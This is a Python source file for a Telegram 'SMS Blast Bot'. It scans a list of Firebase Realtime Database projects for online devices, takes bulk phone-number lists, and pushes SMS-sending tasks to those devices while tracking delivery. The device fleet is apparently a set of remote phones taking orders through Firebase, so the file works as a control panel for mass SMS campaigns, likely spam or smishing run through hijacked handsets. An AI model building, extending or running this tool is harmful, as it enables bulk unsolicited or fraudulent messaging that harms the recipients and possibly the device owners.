"""
Telegram SMS Blast Bot — Firebase RTDB edition

Commands:
  /start  — scan all Firebase projects for devices
  /send   — start a campaign
  /cancel — reset session
"""

import io
import csv
import logging
import os
import re
import asyncio
import time

import phonenumbers
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

import rtdb

load_dotenv()
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger(__name__)

BOT_TOKEN = os.environ["BOT_TOKEN"]

WAIT_NUMBERS, WAIT_MESSAGE, WAIT_CONFIRM = range(3)

KEY_DEVS = "devices"
KEY_NUMS = "numbers"
KEY_MSG  = "sms_text"


def normalize_phone(raw: str) -> str | None:
    raw = re.sub(r"[\s\-\(\)]", "", raw.strip())
    for cc in ("+91", "+1"):
        candidate = raw if raw.startswith("+") else cc + raw.lstrip("0")
        try:
            p = phonenumbers.parse(candidate, None)
            if phonenumbers.is_valid_number(p):
                return phonenumbers.format_number(p, phonenumbers.PhoneNumberFormat.E164)
        except Exception:
            pass
    return None


def parse_numbers(text: str) -> tuple[list[str], list[str]]:
    valid, invalid = [], []
    for line in re.split(r"[\n,;]+", text):
        line = line.strip()
        if not line:
            continue
        norm = normalize_phone(line)
        if norm:
            valid.append(norm)
        else:
            invalid.append(line)
    seen, deduped = set(), []
    for n in valid:
        if n not in seen:
            seen.add(n)
            deduped.append(n)
    return deduped, invalid


def parse_csv_bytes(data: bytes) -> tuple[list[str], list[str]]:
    text = data.decode("utf-8", errors="replace")
    reader = csv.DictReader(io.StringIO(text))
    phone_col = None
    if reader.fieldnames:
        for f in reader.fieldnames:
            if any(k in f.lower() for k in ("phone", "mobile", "number", "tel", "cell")):
                phone_col = f
                break
        if phone_col is None and reader.fieldnames:
            phone_col = reader.fieldnames[0]
    raw_lines = [row[phone_col] for row in reader if phone_col and phone_col in row]
    return parse_numbers("\n".join(raw_lines))


def confirm_keyboard():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("✅ Send Now", callback_data="yes"),
        InlineKeyboardButton("❌ Cancel",   callback_data="no"),
    ]])


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text("\U0001f504 Scanning all Firebase projects for online devices…")

    devices = await rtdb.discover_all_devices()
    ctx.bot_data[KEY_DEVS] = devices

    total_projects  = len(rtdb.RTDB_URLS)
    active_projects = len({d.db_url for d in devices})
    capacity        = active_projects * rtdb.MAX_SMS_PER_DB

    lines = [
        f"\U0001f4e6 *{active_projects}/{total_projects}* projects online",
        f"\U0001f4f1 *{len(devices)}* device(s) found",
        f"\U0001f680 Capacity this run: *{capacity:,}* SMS",
        "",
        "Use /send to start a campaign.",
    ]
    await msg.edit_text("\n".join(lines), parse_mode="Markdown")


async def cmd_send(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    devices = ctx.bot_data.get(KEY_DEVS)
    if not devices:
        await update.message.reply_text("Run /start first to load devices.")
        return ConversationHandler.END

    db_count = len({d.db_url for d in devices})
    capacity = db_count * rtdb.MAX_SMS_PER_DB
    await update.message.reply_text(
        f"\U0001f4cb Send phone numbers now.\n"
        f"Capacity: *{capacity:,}* SMS across *{db_count}* project(s)\n\n"
        "Options:\n"
        "  • Upload *.csv* (column: phone/mobile/number)\n"
        "  • Paste numbers one per line\n\n"
        "Example:\n`9876543210\n+919123456789\n8001234567`",
        parse_mode="Markdown",
    )
    return WAIT_NUMBERS


async def receive_numbers_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    f = await update.message.document.get_file()
    buf = await f.download_as_bytearray()
    valid, invalid = parse_csv_bytes(bytes(buf))
    return await _store_numbers(update, ctx, valid, invalid)


async def receive_numbers_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    valid, invalid = parse_numbers(update.message.text or "")
    return await _store_numbers(update, ctx, valid, invalid)


async def _store_numbers(update, ctx, valid, invalid) -> int:
    if not valid:
        await update.message.reply_text("❌ No valid numbers found. Try again.")
        return WAIT_NUMBERS

    devices  = ctx.bot_data.get(KEY_DEVS, [])
    db_count = len({d.db_url for d in devices})
    capacity  = db_count * rtdb.MAX_SMS_PER_DB
    will_send = min(len(valid), capacity)
    skipped   = len(valid) - will_send

    ctx.user_data[KEY_NUMS] = valid[:will_send]

    text = (
        f"✅ *{will_send:,}* numbers ready"
        + (f"  _(+{len(invalid)} invalid skipped)_" if invalid else "")
        + (f"\n⚠️ {skipped} dropped — over capacity" if skipped else "")
        + "\n\nNow type the *SMS message* to send:"
    )
    await update.message.reply_text(text, parse_mode="Markdown")
    return WAIT_MESSAGE


async def receive_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    text = (update.message.text or "").strip()
    if not text:
        await update.message.reply_text("Message can't be empty. Try again:")
        return WAIT_MESSAGE

    ctx.user_data[KEY_MSG] = text

    numbers  = ctx.user_data[KEY_NUMS]
    devices  = ctx.bot_data.get(KEY_DEVS, [])
    db_count = len({d.db_url for d in devices})
    chars    = len(text)
    segs     = max(1, -(-chars // 160))

    await update.message.reply_text(
        f"\U0001f4ca *Campaign Summary*\n\n"
        f"Recipients  : *{len(numbers):,}*\n"
        f"Projects    : *{db_count}* Firebase DBs\n"
        f"Per project : up to *{rtdb.MAX_SMS_PER_DB}* SMS\n"
        f"Msg length  : *{chars}* chars · *{segs}* segment(s)\n\n"
        f"\U0001f4dd _Message:_\n`{text[:300]}`\n\n"
        "Send?",
        parse_mode="Markdown",
        reply_markup=confirm_keyboard(),
    )
    return WAIT_CONFIRM


async def handle_confirm(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    q = update.callback_query
    await q.answer()

    if q.data == "no":
        ctx.user_data.clear()
        await q.edit_message_text("Cancelled. /send to start over.")
        return ConversationHandler.END

    numbers = ctx.user_data.get(KEY_NUMS, [])
    text    = ctx.user_data.get(KEY_MSG, "")
    devices = ctx.bot_data.get(KEY_DEVS, [])

    if not numbers or not text or not devices:
        await q.edit_message_text("Session expired. /start again.")
        return ConversationHandler.END

    db_count = len({d.db_url for d in devices})
    prog_msg = await q.edit_message_text(
        f"\U0001f680 Writing *{len(numbers):,}* SMS tasks to *{db_count}* Firebase projects…",
        parse_mode="Markdown",
    )

    last_edit = [time.time()]

    async def on_write_progress(written: int, total: int, failed: int):
        if time.time() - last_edit[0] < 3:
            return
        last_edit[0] = time.time()
        pct = int(written / total * 100) if total else 0
        bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
        try:
            await prog_msg.edit_text(
                f"\U0001f4e1 Writing tasks…\n`{bar}` {pct}%\n"
                f"✅ {written:,}  ❌ {failed:,}",
                parse_mode="Markdown",
            )
        except Exception:
            pass

    # dispatch_campaign now returns (campaign_tag, task_log list)
    campaign_tag, task_log = await rtdb.dispatch_campaign(
        devices=devices,
        numbers=numbers,
        text=text,
        progress_cb=on_write_progress,
    )

    total_written = len(task_log)

    await prog_msg.edit_text(
        f"✅ *{total_written:,}* tasks dispatched!\n\n"
        f"\U0001f4ca Monitoring delivery…\n"
        f"_(updates every {rtdb.POLL_INTERVAL}s for up to {rtdb.POLL_TIMEOUT//60}m)_",
        parse_mode="Markdown",
    )

    stat_msg = await update.effective_message.reply_text("⏳ Waiting for devices to send…")

    async def on_stat_update(grand: rtdb.CampaignStats, detail):
        pct = int(grand.sent / grand.total * 100) if grand.total else 0
        bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
        lines = [
            f"\U0001f4ca *Live Stats — Campaign* `{campaign_tag}`\n",
            f"`{bar}` {pct}%\n",
            f"✅ Sent    : *{grand.sent:,}*",
            f"❌ Failed  : *{grand.failed:,}*",
            f"⏳ Pending : *{grand.pending:,}*",
            f"\U0001f4e6 Total   : *{grand.total:,}*",
        ]
        if grand.pending == 0:
            lines.append("\n\U0001f389 *All tasks resolved!*")
        try:
            await stat_msg.edit_text("\n".join(lines), parse_mode="Markdown")
        except Exception:
            pass

    # poll_stats now takes (task_log list, campaign_tag)
    await rtdb.poll_stats(task_log, campaign_tag, update_cb=on_stat_update)

    ctx.user_data.clear()
    return ConversationHandler.END


async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    ctx.user_data.clear()
    await update.message.reply_text("Cancelled. /start or /send to begin.")
    return ConversationHandler.END


def main():
    app = Application.builder().token(BOT_TOKEN).build()

    send_conv = ConversationHandler(
        entry_points=[CommandHandler("send", cmd_send)],
        states={
            WAIT_NUMBERS: [
                MessageHandler(filters.Document.ALL, receive_numbers_file),
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_numbers_text),
            ],
            WAIT_MESSAGE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_message),
            ],
            WAIT_CONFIRM: [
                CallbackQueryHandler(handle_confirm, pattern="^(yes|no)$"),
            ],
        },
        fallbacks=[CommandHandler("cancel", cmd_cancel)],
        per_user=True,
        per_chat=True,
    )

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(send_conv)

    log.info("Bot started with %d RTDB projects", len(rtdb.RTDB_URLS))
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
